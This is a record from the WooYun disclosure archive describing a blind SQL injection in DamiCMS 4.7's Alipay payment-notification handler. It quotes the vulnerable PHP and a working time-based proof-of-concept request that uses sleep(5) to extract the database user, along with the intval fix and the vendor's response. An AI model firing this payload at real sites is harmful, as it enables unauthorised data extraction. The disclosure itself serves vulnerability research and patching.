{"id": 41681, "wybug_id": "wooyun-2014-087989", "wybug_title": "大米CMS最新版SQL盲注5绕过防御", "wybug_corp": "damicms.com", "wybug_author": "xfkxfk", "wybug_date": "2014-12-24 11:08", "wybug_open_date": "2015-03-24 11:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "安全意识不足", "源码审核", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-27：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-02-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-24：\t细节向公众公开  简要描述： 大米CMS最新版4.7，SQL盲注 详细说明：  大米CMS最新版4.7，SQL盲注，绕过防御文件/Web/Lib/Action/PublicAction.class.php：\n//在线充值或在线订单处理function shouquan(){$ap_path = (intval(C('AP_TYPE'))==1?'ap_jishi':'ap_danbao');require_once(\"./Trade/{$ap_path}/alipay.config.php\");require_once(\"./Trade/{$ap_path}/lib/alipay_notify.class.php\");//计算得出通知验证结果$alipayNotify = new AlipayNotify($alipay_config);$verify_result = $alipayNotify->verifyNotify();//if($verify_result) {//验证成功if(!$verify_result) {//假设这里验证成功\t\t//商户订单号WIDout_trade_no\t$out_trade_no = $_POST['out_trade_no'];\t//支付宝交易号\t$trade_no = $_POST['trade_no'];\t//交易状态\t$trade_status = $_POST['trade_status'];\t\t$total_fee = $_POST['total_fee'];\t\tif($_POST['trade_status'] == 'WAIT_BUYER_PAY') {\t//该判断表示买家已在支付宝交易管理中产生了交易记录，但没有付款\t\t\t//判断该笔订单是否在商户网站中已经做过处理\t\t\t//如果没有做过处理，根据订单号（out_trade_no）在商户网站的订单系统中查到该笔订单的详细，并执行商户的业务程序\t\t\t//如果有做过处理，不执行商户的业务程序\t\t\t\tM('member_trade')->where(\"out_trade_no='{$out_trade_no}' or group_trade_no='{$out_trade_no}'\")->setField('status',0);\t\t\tlogResult('等待买家付款!');    echo \"success\";\t\t//请不要修改或删除    }\telse if($_POST['trade_status'] == 'WAIT_SELLER_SEND_GOODS') {\t//该判断表示买家已在支付宝交易管理中产生了交易记录且付款成功，但卖家没有发货\t\t//判断该笔订单是否在商户网站中已经做过处理\t\t//如果没有做过处理，根据订单号（out_trade_no）在商户网站的订单系统中查到该笔订单的详细，并执行商户的业务程序\t\t//如果有做过处理，不执行商户的业务程序\tM('member_trade')->where(\"out_trade_no='{$out_trade_no}' or group_trade_no='{$out_trade_no}'\")->setField('status',1);\tlogResult('已付款，等待发货!');\techo \"success\";\t\t//请不要修改或删除\t\t\t\t        //调试用，写文本函数记录程序运行情况是否正常        //logResult(\"这里写入想要调试的代码变量值，或其他运行的结果记录\");    }\telse if($_POST['trade_status'] == 'WAIT_BUYER_CONFIRM_GOODS') {\t//该判断表示卖家已经发了货，但买家还没有做确认收货的操作\t\t\t//判断该笔订单是否在商户网站中已经做过处理\t\t\t//如果没有做过处理，根据订单号（out_trade_no）在商户网站的订单系统中查到该笔订单的详细，并执行商户的业务程序\t\t\t//如果有做过处理，不执行商户的业务程序\t\tM('member_trade')->where(\"out_trade_no='{$out_trade_no}' or group_trade_no='{$out_trade_no}'\")->setField('status',2);\t\t\tlogResult('已发货,等待收货!');        echo \"success\";\t\t//请不要修改或删除        //调试用，写文本函数记录程序运行情况是否正常        //logResult(\"这里写入想要调试的代码变量值，或其他运行的结果记录\");    }\telse if($_POST['trade_status'] == 'TRADE_FINISHED' || $_POST['trade_status'] == 'TRADE_SUCCESS') {\t\tM('member_trade')->where(\"out_trade_no='{$out_trade_no}' or group_trade_no='{$out_trade_no}'\")->setField('status',3);\t    $trade_type = substr($out_trade_no,0,2);\t\tif($trade_type == \"CZ\"){\t\t$arr = explode(\"-\",$out_trade_no);\t\tif(count($arr)==2){        $uid = intval($arr[1]);\t\tif($uid>0){        M('member')->where('uid='.$uid)->setInc('money',$total_fee); \t\t\t\t//logResult(M('dami_common_member',null)->getLastSql().'<BR>');\t\t$data['uid'] =$uid;\t\t$data['addtime'] = time();\t\t$data['price'] =$total_fee;\t\t$data['trade_no'] = $out_trade_no;\t\t$data['remark'] = \"用户充值\";\t\t$data['log_type'] = 0;\t\tM('money_log')->add($data);\t\t//logResult(M('money_log')->getLastSql().'<BR>');\t\t}\t\t}\t}\t//退款退货相关\telse if($_POST['refund_status'] == 'WAIT_SELLER_AGREE'){\tM('member_trade')->where(\"out_trade_no='{$out_trade_no}' or group_trade_no='{$out_trade_no}'\")->setField('status',7);\t\t}\telse if($_POST['refund_status'] == 'WAIT_BUYER_RETURN_GOODS'){\tM('member_trade')->where(\"out_trade_no='{$out_trade_no}' or group_trade_no='{$out_trade_no}'\")->setField('status',8);\t}\telse if($_POST['refund_status'] == 'REFUND_SUCCESS'){\tM('member_trade')->where(\"out_trade_no='{$out_trade_no}' or group_trade_no='{$out_trade_no}'\")->setField('status',9);\t\t\t}\telse if($_POST['trade_status'] == 'TRADE_CLOSED'){\tM('member_trade')->where(\"out_trade_no='{$out_trade_no}' or group_trade_no='{$out_trade_no}'\")->setField('status',10);\t}\telse{\tlogResult($out_trade_no.'<BR>');\t}\t//该判断表示买家已经确认收货，这笔交易完成\t\t\t//判断该笔订单是否在商户网站中已经做过处理\t\t\t//如果没有做过处理，根据订单号（out_trade_no）在商户网站的订单系统中查到该笔订单的详细，并执行商户的业务程序\t\t\t//如果有做过处理，不执行商户的业务程序\t\tlogResult('交易完成!');        echo \"success\";\t\t//请不要修改或删除        //调试用，写文本函数记录程序运行情况是否正常        //logResult(\"这里写入想要调试的代码变量值，或其他运行的结果记录\");    }    else {\t\t//其他状态判断\t\tlogResult('其他状态!');        echo \"success\";        //调试用，写文本函数记录程序运行情况是否正常        //logResult (\"这里写入想要调试的代码变量值，或其他运行的结果记录\");    }\t//——请根据您的业务逻辑来编写程序（以上代码仅作参考）——\t\t/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////}else {    //验证失败\tlogResult('验证失败<BR>');    echo \"fail\";    //调试用，写文本函数记录程序运行情况是否正常    //logResult(\"这里写入想要调试的代码变量值，或其他运行的结果记录\");}}\n先看这里：\n$verify_result = $alipayNotify->verifyNotify();\n这里的$verify_result就是在支付时进行验证的结果正常情况下，使用这里的支付时，这里肯定是验证成功的所以这里的$verify_result应该是返回True的所以这里我们假设$verify_result=True当验证成功后，进入到下面：\n$out_trade_no = $_POST['out_trade_no'];\t//支付宝交易号\t$trade_no = $_POST['trade_no'];\t//交易状态\t$trade_status = $_POST['trade_status'];\t$total_fee = $_POST['total_fee'];\t\tif($_POST['trade_status'] == 'WAIT_BUYER_PAY') {\tM('member_trade')->where(\"out_trade_no='{$out_trade_no}' or group_trade_no='{$out_trade_no}'\")->setField('status',0);\t\t\tlogResult('等待买家付款!');    echo \"success\";\t\t//请不要修改或删除    }\nPOST的内容直接进入了where条件中在where条件中，字符串是不做处理的，导致sql漏洞产生继续下面的内容，同样产生大量的sql注入   漏洞证明：  发送请求：\nhttp://localhost/dami/index.php?s=/Public/shouquan.htmlout_trade_no=111' %26%26 CASE WHEN(mid((user()) from 1 for 1)=char(114)) THEN sleep(5) ELSE (0) END%23&trade_status=WAIT_BUYER_PAY\n这里会延时5秒返回：\n\n看看数据库执行记录：\n\n   修复方案：  intval   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：3  确认时间：2014-12-24 11:41 厂商回复： 已加强防御 谢谢 到官网下新版 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-24 11:42 |    \t\tManning \t\t\t( 普通白帽子  |\t\t\t        Rank:559 漏洞数:78        | 就恨自己服务器太少)\t\t \n  这么快就确认了    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 3, "Ranks": null}